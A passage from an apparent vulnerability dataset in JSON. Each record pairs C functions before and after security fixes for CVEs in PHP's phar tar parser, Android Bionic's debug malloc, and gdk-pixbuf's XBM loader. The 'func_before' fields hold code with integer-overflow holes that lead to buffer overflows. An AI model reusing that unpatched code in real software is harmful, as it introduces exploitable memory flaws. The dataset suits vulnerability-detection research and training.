hdr->prefix[0] != 0) {\n\t\t\tchar name[256];\n\t\t\tint i, j;\n\n\t\t\tfor (i = 0; i < 155; i++) {\n\t\t\t\tname[i] = hdr->prefix[i];\n\t\t\t\tif (name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tname[i++] = '/';\n\t\t\tfor (j = 0; j < 100; j++) {\n\t\t\t\tname[i+j] = hdr->name[j];\n\t\t\t\tif (name[i+j] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tentry.filename_len = i+j;\n\n\t\t\tif (name[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t\tentry.filename = pestrndup(name, entry.filename_len, myphar->is_persistent);\n\t\t} else if (!last_was_longlink) {\n\t\t\tint i;\n\n\t\t\t/* calculate strlen, which can be no longer than 100 */\n\t\t\tfor (i = 0; i < 100; i++) {\n\t\t\t\tif (hdr->name[i] == '\\0') {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t\tentry.filename_len = i;\n\t\t\tentry.filename = pestrndup(hdr->name, i, myphar->is_persistent);\n\n\t\t\tif (entry.filename[entry.filename_len - 1] == '/') {\n\t\t\t\t/* some tar programs store directories with trailing slash */\n\t\t\t\tentry.filename[entry.filename_len - 1] = '\\0';\n\t\t\t\tentry.filename_len--;\n\t\t\t}\n\t\t}\n\t\tlast_was_longlink = 0;\n\n\t\tphar_add_virtual_dirs(myphar, entry.filename, entry.filename_len TSRMLS_CC);\n\n\t\tif (sum1 != sum2) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (checksum mismatch of file \\\"%s\\\")\", fname, entry.filename);\n\t\t\t}\n\t\t\tpefree(entry.filename, myphar->is_persistent);\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\n\t\tentry.tar_type = ((old & (hdr->typeflag == '\\0')) ? TAR_FILE : hdr->typeflag);\n\t\tentry.offset = entry.offset_abs = pos; /* header_offset unused in tar */\n\t\tentry.fp_type = PHAR_FP;\n\t\tentry.flags = phar_tar_number(hdr->mode, sizeof(hdr->mode)) & PHAR_ENT_PERM_MASK;\n\t\tentry.timestamp = phar_tar_number(hdr->mtime, sizeof(hdr->mtime));\n\t\tentry.is_persistent = myphar->is_persistent;\n#ifndef S_ISDIR\n#define S_ISDIR(mode)\t(((mode)&S_IFMT) == S_IFDIR)\n#endif\n\t\tif (old && entry.tar_type == TAR_FILE && S_ISDIR(entry.flags)) {\n\t\t\tentry.tar_type = TAR_DIR;\n\t\t}\n\n\t\tif (entry.tar_type == TAR_DIR) {\n\t\t\tentry.is_dir = 1;\n\t\t} else {\n\t\t\tentry.is_dir = 0;\n\t\t}\n\n\t\tentry.link = NULL;\n\n\t\tif (entry.tar_type == TAR_LINK) {\n\t\t\tif (!zend_hash_exists(&myphar->manifest, hdr->linkname, strlen(hdr->linkname))) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file - hard link to non-existent file \\\"%s\\\"\", fname, hdr->linkname);\n\t\t\t\t}\n\t\t\t\tpefree(entry.filename, entry.is_persistent);\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t} else if (entry.tar_type == TAR_SYMLINK) {\n\t\t\tentry.link = estrdup(hdr->linkname);\n\t\t}\n\t\tphar_set_inode(&entry TSRMLS_CC);\n\t\tzend_hash_add(&myphar->manifest, entry.filename, entry.filename_len, (void*)&entry, sizeof(phar_entry_info), (void **) &newentry);\n\n\t\tif (entry.is_persistent) {\n\t\t\t++entry.manifest_pos;\n\t\t}\n\n\t\tif (entry.filename_len >= sizeof(\".phar/.metadata\")-1 && !memcmp(entry.filename, \".phar/.metadata\", sizeof(\".phar/.metadata\")-1)) {\n\t\t\tif (FAILURE == phar_tar_process_metadata(newentry, fp TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has invalid metadata in magic file \\\"%s\\\"\", fname, entry.filename);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tif (!actual_alias && entry.filename_len == sizeof(\".phar/alias.txt\")-1 && !strncmp(entry.filename, \".phar/alias.txt\", sizeof(\".phar/alias.txt\")-1)) {\n\t\t\t/* found explicit alias */\n\t\t\tif (size > 511) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: tar-based phar \\\"%s\\\" has alias that is larger than 511 bytes, cannot process\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\n\t\t\tread = php_stream_read(fp, buf, size);\n\n\t\t\tif (read == size) {\n\t\t\t\tbuf[size] = '\\0';\n\t\t\t\tif (!phar_validate_alias(buf, size)) {\n\t\t\t\t\tif (size > 50) {\n\t\t\t\t\t\tbuf[50] = '.';\n\t\t\t\t\t\tbuf[51] = '.';\n\t\t\t\t\t\tbuf[52] = '.';\n\t\t\t\t\t\tbuf[53] = '\\0';\n\t\t\t\t\t}\n\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: invalid alias \\\"%s\\\" in tar-based phar \\\"%s\\\"\", buf, fname);\n\t\t\t\t\t}\n\n\t\t\t\t\tphp_stream_close(fp);\n\t\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\n\t\t\t\tactual_alias = pestrndup(buf, size, myphar->is_persistent);\n\t\t\t\tmyphar->alias = actual_alias;\n\t\t\t\tmyphar->alias_len = size;\n\t\t\t\tphp_stream_seek(fp, pos, SEEK_SET);\n\t\t\t} else {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to read alias from tar-based phar \\\"%s\\\"\", fname);\n\t\t\t\t}\n\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tsize = (size+511)&~511;\n\n\t\tif (((hdr->typeflag == '\\0') || (hdr->typeflag == TAR_FILE)) && size > 0) {\n\t\t\t/* this is not good enough - seek succeeds even on truncated tars */\n\t\t\tphp_stream_seek(fp, size, SEEK_CUR);\n\t\t\tif ((uint)php_stream_tell(fp) > totalsize) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t\t}\n\t\t\t\tphp_stream_close(fp);\n\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tread = php_stream_read(fp, buf, sizeof(buf));\n\n\t\tif (read != sizeof(buf)) {\n\t\t\tif (error) {\n\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (truncated)\", fname);\n\t\t\t}\n\t\t\tphp_stream_close(fp);\n\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\t\treturn FAILURE;\n\t\t}\n\t} while (read != 0);\n\n\tif (zend_hash_exists(&(myphar->manifest), \".phar/stub.php\", sizeof(\".phar/stub.php\")-1)) {\n\t\tmyphar->is_data = 0;\n\t} else {\n\t\tmyphar->is_data = 1;\n\t}\n\n\t/* ensure signature set */\n\tif (!myphar->is_data && PHAR_G(require_hash) && !myphar->signature) {\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\tif (error) {\n\t\t\tspprintf(error, 0, \"tar-based phar \\\"%s\\\" does not have a signature\", fname);\n\t\t}\n\t\treturn FAILURE;\n\t}\n\n\tmyphar->fname = pestrndup(fname, fname_len, myphar->is_persistent);\n#ifdef PHP_WIN32\n\tphar_unixify_path_separators(myphar->fname, fname_len);\n#endif\n\tmyphar->fname_len = fname_len;\n\tmyphar->fp = fp;\n\tp = strrchr(myphar->fname, '/');\n\n\tif (p) {\n\t\tmyphar->ext = memchr(p, '.', (myphar->fname + fname_len) - p);\n\t\tif (myphar->ext == p) {\n\t\t\tmyphar->ext = memchr(p + 1, '.', (myphar->fname + fname_len) - p - 1);\n\t\t}\n\t\tif (myphar->ext) {\n\t\t\tmyphar->ext_len = (myphar->fname + fname_len) - myphar->ext;\n\t\t}\n\t}\n\n\tphar_request_initialize(TSRMLS_C);\n\n\tif (SUCCESS != zend_hash_add(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len, (void*)&myphar, sizeof(phar_archive_data*), (void **)&actual)) {\n\t\tif (error) {\n\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\" to phar registry\", fname);\n\t\t}\n\t\tphp_stream_close(fp);\n\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n\t\treturn FAILURE;\n\t}\n\n\tmyphar = *actual;\n\n\tif (actual_alias) {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tmyphar->is_temporary_alias = 0;\n\n\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void **)&fd_ptr)) {\n\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, actual_alias, myphar->alias_len TSRMLS_CC)) {\n\t\t\t\tif (error) {\n\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t}\n\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\treturn FAILURE;\n\t\t\t}\n\t\t}\n\n\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), actual_alias, myphar->alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t} else {\n\t\tphar_archive_data **fd_ptr;\n\n\t\tif (alias_len) {\n\t\t\tif (SUCCESS == zend_hash_find(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void **)&fd_ptr)) {\n\t\t\t\tif (SUCCESS != phar_free_alias(*fd_ptr, alias, alias_len TSRMLS_CC)) {\n\t\t\t\t\tif (error) {\n\t\t\t\t\t\tspprintf(error, 4096, \"phar error: Unable to add tar-based phar \\\"%s\\\", alias is already in use\", fname);\n\t\t\t\t\t}\n\t\t\t\t\tzend_hash_del(&(PHAR_GLOBALS->phar_fname_map), myphar->fname, fname_len);\n\t\t\t\t\treturn FAILURE;\n\t\t\t\t}\n\t\t\t}\n\t\t\tzend_hash_add(&(PHAR_GLOBALS->phar_alias_map), alias, alias_len, (void*)&myphar, sizeof(phar_archive_data*), NULL);\n\t\t\tmyphar->alias = pestrndup(alias, alias_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = alias_len;\n\t\t} else {\n\t\t\tmyphar->alias = pestrndup(myphar->fname, fname_len, myphar->is_persistent);\n\t\t\tmyphar->alias_len = fname_len;\n\t\t}\n\n\t\tmyphar->is_temporary_alias = 1;\n\t}\n\n\tif (pphar) {\n\t\t*pphar = myphar;\n\t}\n\n\treturn SUCCESS;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -143,6 +143,16 @@\n \t\t\tlast_was_longlink = 1;\n \t\t\t/* support the ././@LongLink system for storing long filenames */\n \t\t\tentry.filename_len = entry.uncompressed_filesize;\n+\n+\t\t\t/* Check for overflow - bug 61065 */\n+\t\t\tif (entry.filename_len == UINT_MAX) {\n+\t\t\t\tif (error) {\n+\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (invalid entry size)\", fname);\n+\t\t\t\t}\n+\t\t\t\tphp_stream_close(fp);\n+\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);\n+\t\t\t\treturn FAILURE;\n+\t\t\t}\n \t\t\tentry.filename = pemalloc(entry.filename_len+1, myphar->is_persistent);\n \n \t\t\tread = php_stream_read(fp, entry.filename, entry.filename_len);",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "",
                "\t\t\t/* Check for overflow - bug 61065 */",
                "\t\t\tif (entry.filename_len == UINT_MAX) {",
                "\t\t\t\tif (error) {",
                "\t\t\t\t\tspprintf(error, 4096, \"phar error: \\\"%s\\\" is a corrupted tar file (invalid entry size)\", fname);",
                "\t\t\t\t}",
                "\t\t\t\tphp_stream_close(fp);",
                "\t\t\t\tphar_destroy_phar_data(myphar TSRMLS_CC);",
                "\t\t\t\treturn FAILURE;",
                "\t\t\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2674",
        "func_name": "aosp-mirror/platform_bionic/leak_malloc",
        "description": "Multiple integer overflows in the (1) chk_malloc, (2) leak_malloc, and (3) leak_memalign functions in libc/bionic/malloc_debug_leak.c in Bionic (libc) for Android, when libc.debug.malloc is set, make it easier for context-dependent attackers to perform memory-related attacks such as buffer overflows via a large size value, which causes less memory to be allocated than expected.",
        "git_url": "https://github.com/aosp-mirror/platform_bionic/commit/7f5aa4f35e23fd37425b3a5041737cdf58f87385",
        "commit_title": "bionic: fix integer overflows in chk_malloc(), leak_malloc(), and leak_memalign()",
        "commit_text": " The allocation size in chk_malloc(), leak_malloc(), and leak_memalign() functions may be rounded up to a small value, leading to buffer overflows. The code only runs in debugging mode.  This patch complements commit 6f04a0f4 (CVE-2009-0607). ",
        "func_before": "void* leak_malloc(size_t bytes)\n{\n    // allocate enough space infront of the allocation to store the pointer for\n    // the alloc structure. This will making free'ing the structer really fast!\n\n    // 1. allocate enough memory and include our header\n    // 2. set the base pointer to be right after our header\n\n    void* base = dlmalloc(bytes + sizeof(AllocationEntry));\n    if (base != NULL) {\n        pthread_mutex_lock(&gAllocationsMutex);\n\n            intptr_t backtrace[BACKTRACE_SIZE];\n            size_t numEntries = get_backtrace(backtrace, BACKTRACE_SIZE);\n\n            AllocationEntry* header = (AllocationEntry*)base;\n            header->entry = record_backtrace(backtrace, numEntries, bytes);\n            header->guard = GUARD;\n\n            // now increment base to point to after our header.\n            // this should just work since our header is 8 bytes.\n            base = (AllocationEntry*)base + 1;\n\n        pthread_mutex_unlock(&gAllocationsMutex);\n    }\n\n    return base;\n}",
        "func": "void* leak_malloc(size_t bytes)\n{\n    // allocate enough space infront of the allocation to store the pointer for\n    // the alloc structure. This will making free'ing the structer really fast!\n\n    // 1. allocate enough memory and include our header\n    // 2. set the base pointer to be right after our header\n\n    size_t size = bytes + sizeof(AllocationEntry);\n    if (size < bytes) { // Overflow.\n        return NULL;\n    }\n\n    void* base = dlmalloc(size);\n    if (base != NULL) {\n        pthread_mutex_lock(&gAllocationsMutex);\n\n            intptr_t backtrace[BACKTRACE_SIZE];\n            size_t numEntries = get_backtrace(backtrace, BACKTRACE_SIZE);\n\n            AllocationEntry* header = (AllocationEntry*)base;\n            header->entry = record_backtrace(backtrace, numEntries, bytes);\n            header->guard = GUARD;\n\n            // now increment base to point to after our header.\n            // this should just work since our header is 8 bytes.\n            base = (AllocationEntry*)base + 1;\n\n        pthread_mutex_unlock(&gAllocationsMutex);\n    }\n\n    return base;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -6,7 +6,12 @@\n     // 1. allocate enough memory and include our header\n     // 2. set the base pointer to be right after our header\n \n-    void* base = dlmalloc(bytes + sizeof(AllocationEntry));\n+    size_t size = bytes + sizeof(AllocationEntry);\n+    if (size < bytes) { // Overflow.\n+        return NULL;\n+    }\n+\n+    void* base = dlmalloc(size);\n     if (base != NULL) {\n         pthread_mutex_lock(&gAllocationsMutex);\n ",
        "diff_line_info": {
            "deleted_lines": [
                "    void* base = dlmalloc(bytes + sizeof(AllocationEntry));"
            ],
            "added_lines": [
                "    size_t size = bytes + sizeof(AllocationEntry);",
                "    if (size < bytes) { // Overflow.",
                "        return NULL;",
                "    }",
                "",
                "    void* base = dlmalloc(size);"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2674",
        "func_name": "aosp-mirror/platform_bionic/chk_malloc",
        "description": "Multiple integer overflows in the (1) chk_malloc, (2) leak_malloc, and (3) leak_memalign functions in libc/bionic/malloc_debug_leak.c in Bionic (libc) for Android, when libc.debug.malloc is set, make it easier for context-dependent attackers to perform memory-related attacks such as buffer overflows via a large size value, which causes less memory to be allocated than expected.",
        "git_url": "https://github.com/aosp-mirror/platform_bionic/commit/7f5aa4f35e23fd37425b3a5041737cdf58f87385",
        "commit_title": "bionic: fix integer overflows in chk_malloc(), leak_malloc(), and leak_memalign()",
        "commit_text": " The allocation size in chk_malloc(), leak_malloc(), and leak_memalign() functions may be rounded up to a small value, leading to buffer overflows. The code only runs in debugging mode.  This patch complements commit 6f04a0f4 (CVE-2009-0607). ",
        "func_before": "void* chk_malloc(size_t bytes)\n{\n    char* buffer = (char*)dlmalloc(bytes + CHK_OVERHEAD_SIZE);\n    if (buffer) {\n        memset(buffer, CHK_SENTINEL_VALUE, bytes + CHK_OVERHEAD_SIZE);\n        size_t offset = dlmalloc_usable_size(buffer) - sizeof(size_t);\n        *(size_t *)(buffer + offset) = bytes;\n        buffer += CHK_SENTINEL_HEAD_SIZE;\n    }\n    return buffer;\n}",
        "func": "void* chk_malloc(size_t bytes)\n{\n    size_t size = bytes + CHK_OVERHEAD_SIZE;\n    if (size < bytes) { // Overflow.\n        return NULL;\n    }\n    uint8_t* buffer = (uint8_t*) dlmalloc(size);\n    if (buffer) {\n        memset(buffer, CHK_SENTINEL_VALUE, bytes + CHK_OVERHEAD_SIZE);\n        size_t offset = dlmalloc_usable_size(buffer) - sizeof(size_t);\n        *(size_t *)(buffer + offset) = bytes;\n        buffer += CHK_SENTINEL_HEAD_SIZE;\n    }\n    return buffer;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,10 @@\n void* chk_malloc(size_t bytes)\n {\n-    char* buffer = (char*)dlmalloc(bytes + CHK_OVERHEAD_SIZE);\n+    size_t size = bytes + CHK_OVERHEAD_SIZE;\n+    if (size < bytes) { // Overflow.\n+        return NULL;\n+    }\n+    uint8_t* buffer = (uint8_t*) dlmalloc(size);\n     if (buffer) {\n         memset(buffer, CHK_SENTINEL_VALUE, bytes + CHK_OVERHEAD_SIZE);\n         size_t offset = dlmalloc_usable_size(buffer) - sizeof(size_t);",
        "diff_line_info": {
            "deleted_lines": [
                "    char* buffer = (char*)dlmalloc(bytes + CHK_OVERHEAD_SIZE);"
            ],
            "added_lines": [
                "    size_t size = bytes + CHK_OVERHEAD_SIZE;",
                "    if (size < bytes) { // Overflow.",
                "        return NULL;",
                "    }",
                "    uint8_t* buffer = (uint8_t*) dlmalloc(size);"
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2674",
        "func_name": "aosp-mirror/platform_bionic/leak_memalign",
        "description": "Multiple integer overflows in the (1) chk_malloc, (2) leak_malloc, and (3) leak_memalign functions in libc/bionic/malloc_debug_leak.c in Bionic (libc) for Android, when libc.debug.malloc is set, make it easier for context-dependent attackers to perform memory-related attacks such as buffer overflows via a large size value, which causes less memory to be allocated than expected.",
        "git_url": "https://github.com/aosp-mirror/platform_bionic/commit/7f5aa4f35e23fd37425b3a5041737cdf58f87385",
        "commit_title": "bionic: fix integer overflows in chk_malloc(), leak_malloc(), and leak_memalign()",
        "commit_text": " The allocation size in chk_malloc(), leak_malloc(), and leak_memalign() functions may be rounded up to a small value, leading to buffer overflows. The code only runs in debugging mode.  This patch complements commit 6f04a0f4 (CVE-2009-0607). ",
        "func_before": "void* leak_memalign(size_t alignment, size_t bytes)\n{\n    // we can just use malloc\n    if (alignment <= MALLOC_ALIGNMENT)\n        return leak_malloc(bytes);\n\n    // need to make sure it's a power of two\n    if (alignment & (alignment-1))\n        alignment = 1L << (31 - __builtin_clz(alignment));\n\n    // here, aligment is at least MALLOC_ALIGNMENT<<1 bytes\n    // we will align by at least MALLOC_ALIGNMENT bytes\n    // and at most alignment-MALLOC_ALIGNMENT bytes\n    size_t size = (alignment-MALLOC_ALIGNMENT) + bytes;\n    void* base = leak_malloc(size);\n    if (base != NULL) {\n        intptr_t ptr = (intptr_t)base;\n        if ((ptr % alignment) == 0)\n            return base;\n\n        // align the pointer\n        ptr += ((-ptr) % alignment);\n\n        // there is always enough space for the base pointer and the guard\n        ((void**)ptr)[-1] = MEMALIGN_GUARD;\n        ((void**)ptr)[-2] = base;\n\n        return (void*)ptr;\n    }\n    return base;\n}",
        "func": "void* leak_memalign(size_t alignment, size_t bytes)\n{\n    // we can just use malloc\n    if (alignment <= MALLOC_ALIGNMENT)\n        return leak_malloc(bytes);\n\n    // need to make sure it's a power of two\n    if (alignment & (alignment-1))\n        alignment = 1L << (31 - __builtin_clz(alignment));\n\n    // here, aligment is at least MALLOC_ALIGNMENT<<1 bytes\n    // we will align by at least MALLOC_ALIGNMENT bytes\n    // and at most alignment-MALLOC_ALIGNMENT bytes\n    size_t size = (alignment-MALLOC_ALIGNMENT) + bytes;\n    if (size < bytes) { // Overflow.\n        return NULL;\n    }\n\n    void* base = leak_malloc(size);\n    if (base != NULL) {\n        intptr_t ptr = (intptr_t)base;\n        if ((ptr % alignment) == 0)\n            return base;\n\n        // align the pointer\n        ptr += ((-ptr) % alignment);\n\n        // there is always enough space for the base pointer and the guard\n        ((void**)ptr)[-1] = MEMALIGN_GUARD;\n        ((void**)ptr)[-2] = base;\n\n        return (void*)ptr;\n    }\n    return base;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -12,6 +12,10 @@\n     // we will align by at least MALLOC_ALIGNMENT bytes\n     // and at most alignment-MALLOC_ALIGNMENT bytes\n     size_t size = (alignment-MALLOC_ALIGNMENT) + bytes;\n+    if (size < bytes) { // Overflow.\n+        return NULL;\n+    }\n+\n     void* base = leak_malloc(size);\n     if (base != NULL) {\n         intptr_t ptr = (intptr_t)base;",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "    if (size < bytes) { // Overflow.",
                "        return NULL;",
                "    }",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2012-2370",
        "func_name": "GNOME/gdk-pixbuf/read_bitmap_file_data",
        "description": "Multiple integer overflows in the read_bitmap_file_data function in io-xbm.c in gdk-pixbuf before 2.26.1 allow remote attackers to cause a denial of service (application crash) via a negative (1) height or (2) width in an XBM file, which triggers a heap-based buffer overflow.",
        "git_url": "https://github.com/GNOME/gdk-pixbuf/commit/4f0f465f991cd454d03189497f923eb40c170c22",
        "commit_title": "Avoid an integer overflow in the xbm loader",
        "commit_text": " At the same time, reject some silly input, such as negative width or height.  https://bugzilla.gnome.org/show_bug.cgi?id=672811",
        "func_before": "static gboolean\nread_bitmap_file_data (FILE    *fstream,\n\t\t       guint   *width, \n\t\t       guint   *height,\n\t\t       guchar **data,\n\t\t       int     *x_hot, \n\t\t       int     *y_hot)\n{\n\tguchar *bits = NULL;\t\t/* working variable */\n\tchar line[MAX_SIZE];\t\t/* input line from file */\n\tint size;\t\t\t/* number of bytes of data */\n\tchar name_and_type[MAX_SIZE];\t/* an input line */\n\tchar *type;\t\t\t/* for parsing */\n\tint value;\t\t\t/* from an input line */\n\tint version10p;\t\t\t/* boolean, old format */\n\tint padding;\t\t\t/* to handle alignment */\n\tint bytes_per_line;\t\t/* per scanline of data */\n\tguint ww = 0;\t\t\t/* width */\n\tguint hh = 0;\t\t\t/* height */\n\tint hx = -1;\t\t\t/* x hotspot */\n\tint hy = -1;\t\t\t/* y hotspot */\n\n\t/* first time initialization */\n\tif (!initialized) {\n\t\tinit_hex_table ();\n\t}\n\n\t/* error cleanup and return macro */\n#define\tRETURN(code) { g_free (bits); return code; }\n\n\twhile (fgets (line, MAX_SIZE, fstream)) {\n\t\tif (strlen (line) == MAX_SIZE-1)\n\t\t\tRETURN (FALSE);\n\t\tif (sscanf (line,\"#define %s %d\",name_and_type,&value) == 2) {\n\t\t\tif (!(type = strrchr (name_and_type, '_')))\n\t\t\t\ttype = name_and_type;\n\t\t\telse {\n\t\t\t\ttype++;\n\t\t\t}\n\n\t\t\tif (!strcmp (\"width\", type))\n\t\t\t\tww = (unsigned int) value;\n\t\t\tif (!strcmp (\"height\", type))\n\t\t\t\thh = (unsigned int) value;\n\t\t\tif (!strcmp (\"hot\", type)) {\n\t\t\t\tif (type-- == name_and_type\n\t\t\t\t    || type-- == name_and_type)\n\t\t\t\t\tcontinue;\n\t\t\t\tif (!strcmp (\"x_hot\", type))\n\t\t\t\t\thx = value;\n\t\t\t\tif (!strcmp (\"y_hot\", type))\n\t\t\t\t\thy = value;\n\t\t\t}\n\t\t\tcontinue;\n\t\t}\n    \n\t\tif (sscanf (line, \"static short %s = {\", name_and_type) == 1)\n\t\t\tversion10p = 1;\n\t\telse if (sscanf (line,\"static const unsigned char %s = {\",name_and_type) == 1)\n\t\t\tversion10p = 0;\n\t\telse if (sscanf (line,\"static unsigned char %s = {\",name_and_type) == 1)\n\t\t\tversion10p = 0;\n\t\telse if (sscanf (line, \"static const char %s = {\", name_and_type) == 1)\n\t\t\tversion10p = 0;\n\t\telse if (sscanf (line, \"static char %s = {\", name_and_type) == 1)\n\t\t\tversion10p = 0;\n\t\telse\n\t\t\tcontinue;\n\n\t\tif (!(type = strrchr (name_and_type, '_')))\n\t\t\ttype = name_and_type;\n\t\telse\n\t\t\ttype++;\n\n\t\tif (strcmp (\"bits[]\", type))\n\t\t\tcontinue;\n    \n\t\tif (!ww || !hh)\n\t\t\tRETURN (FALSE);\n\n\t\tif ((ww % 16) && ((ww % 16) < 9) && version10p)\n\t\t\tpadding = 1;\n\t\telse\n\t\t\tpadding = 0;\n\n\t\tbytes_per_line = (ww+7)/8 + padding;\n\n\t\tsize = bytes_per_line * hh;\n\t\tbits = g_malloc (size);\n\n\t\tif (version10p) {\n\t\t\tunsigned char *ptr;\n\t\t\tint bytes;\n\n\t\t\tfor (bytes = 0, ptr = bits; bytes < size; (bytes += 2)) {\n\t\t\t\tif ((value = next_int (fstream)) < 0)\n\t\t\t\t\tRETURN (FALSE);\n\t\t\t\t*(ptr++) = value;\n\t\t\t\tif (!padding || ((bytes+2) % bytes_per_line))\n\t\t\t\t\t*(ptr++) = value >> 8;\n\t\t\t}\n\t\t} else {\n\t\t\tunsigned char *ptr;\n\t\t\tint bytes;\n\n\t\t\tfor (bytes = 0, ptr = bits; bytes < size; bytes++, ptr++) {\n\t\t\t\tif ((value = next_int (fstream)) < 0) \n\t\t\t\t\tRETURN (FALSE);\n\t\t\t\t*ptr=value;\n\t\t\t}\n\t\t}\n\t\tbreak;\n\t}\n\n\tif (!bits)\n\t\tRETURN (FALSE);\n\n\t*data = bits;\n\t*width = ww;\n\t*height = hh;\n\tif (x_hot)\n\t\t*x_hot = hx;\n\tif (y_hot)\n\t\t*y_hot = hy;\n\n\treturn TRUE;\n}",
        "func": "static gboolean\nread_bitmap_file_data (FILE    *fstream,\n\t\t       guint   *width, \n\t\t       guint   *height,\n\t\t       guchar **data,\n\t\t       int     *x_hot, \n\t\t       int     *y_hot)\n{\n\tguchar *bits = NULL;\t\t/* working variable */\n\tchar line[MAX_SIZE];\t\t/* input line from file */\n\tint size;\t\t\t/* number of bytes of data */\n\tchar name_and_type[MAX_SIZE];\t/* an input line */\n\tchar *type;\t\t\t/* for parsing */\n\tint value;\t\t\t/* from an input line */\n\tint version10p;\t\t\t/* boolean, old format */\n\tint padding;\t\t\t/* to handle alignment */\n\tint bytes_per_line;\t\t/* per scanline of data */\n\tguint ww = 0;\t\t\t/* width */\n\tguint hh = 0;\t\t\t/* height */\n\tint hx = -1;\t\t\t/* x hotspot */\n\tint hy = -1;\t\t\t/* y hotspot */\n\n\t/* first time initialization */\n\tif (!initialized) {\n\t\tinit_hex_table ();\n\t}\n\n\t/* error cleanup and return macro */\n#define\tRETURN(code) { g_free (bits); return code; }\n\n\twhile (fgets (line, MAX_SIZE, fstream)) {\n\t\tif (strlen (line) == MAX_SIZE-1)\n\t\t\tRETURN (FALSE);\n\t\tif (sscanf (line,\"#define %s %d\",name_and_type,&value) == 2) {\n\t\t\tif (!(type = strrchr (name_and_type, '_')))\n\t\t\t\ttype = name_and_type;\n\t\t\telse {\n\t\t\t\ttype++;\n\t\t\t}\n\n\t\t\tif (!strcmp (\"width\", type)) {\n                                if (value <= 0)\n                                        RETURN (FALSE);\n\t\t\t\tww = (unsigned int) value;\n                        }\n\t\t\tif (!strcmp (\"height\", type)) {\n                                if (value <= 0)\n                                        RETURN (FALSE);\n\t\t\t\thh = (unsigned int) value;\n                        }\n\t\t\tif (!strcmp (\"hot\", type)) {\n\t\t\t\tif (type-- == name_and_type\n\t\t\t\t    || type-- == name_and_type)\n\t\t\t\t\tcontinue;\n\t\t\t\tif (!strcmp (\"x_hot\", type))\n\t\t\t\t\thx = value;\n\t\t\t\tif (!strcmp (\"y_hot\", type))\n\t\t\t\t\thy = value;\n\t\t\t}\n\t\t\tcontinue;\n\t\t}\n    \n\t\tif (sscanf (line, \"static short %s = {\", name_and_type) == 1)\n\t\t\tversion10p = 1;\n\t\telse if (sscanf (line,\"static const unsigned char %s = {\",name_and_type) == 1)\n\t\t\tversion10p = 0;\n\t\telse if (sscanf 